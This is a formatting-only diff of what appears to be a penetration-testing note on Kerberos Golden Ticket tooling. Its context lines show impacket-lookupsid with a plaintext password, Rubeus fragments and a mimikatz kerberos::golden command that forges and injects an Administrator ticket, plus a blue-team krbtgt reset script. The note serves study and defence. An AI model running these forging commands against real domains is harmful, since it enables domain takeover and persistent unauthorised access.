@@ -19,7 +19,7 @@ linked:
 
 # Golden Ticket - Tooling
 
-***
+---
 
 ## impacket-ticketer
 
@@ -46,7 +46,7 @@ impacket-ticketer \
 export KRB5CCNAME=administrator.ccache
 ```
 
-___
+---
 
 ## impacket-lookupsid (Domain SID)
 
@@ -62,7 +62,7 @@ impacket-lookupsid corp.local/administrator:'P@ssw0rd'@dc01.corp.local 0
 # [*] Domain SID is: S-1-5-21-1234567890-987654321-111222333
 ```
 
-___
+---
 
 ## Rubeus golden / diamond / sapphire
 
@@ -86,7 +86,7 @@ ___
   /groups:512 /krbkey:AES256KRBTGTHASH /ptt
 ```
 
-___
+---
 
 ## mimikatz kerberos::golden
 
@@ -103,7 +103,7 @@ mimikatz # kerberos::purge
 mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /aes256:AES256HASH /id:500 /groups:512,513,520,518,519 /endin:600 /ptt
 ```
 
-___
+---
 
 ## New-KrbtgtKeys.ps1 (Blue Team)
 
@@ -122,7 +122,7 @@ Start-Sleep -Seconds 43200  # 12h
 .\New-KrbtgtKeys.ps1 -Mode Reset
 ```
 
-___
+---
 
 ## Recursos
 
@@ -137,4 +137,4 @@ ___
 | MITRE ATT&CK T1558.001 | `https://attack.mitre.org/techniques/T1558/001/` |
 ^gt-tool-resources
 
-***
+---
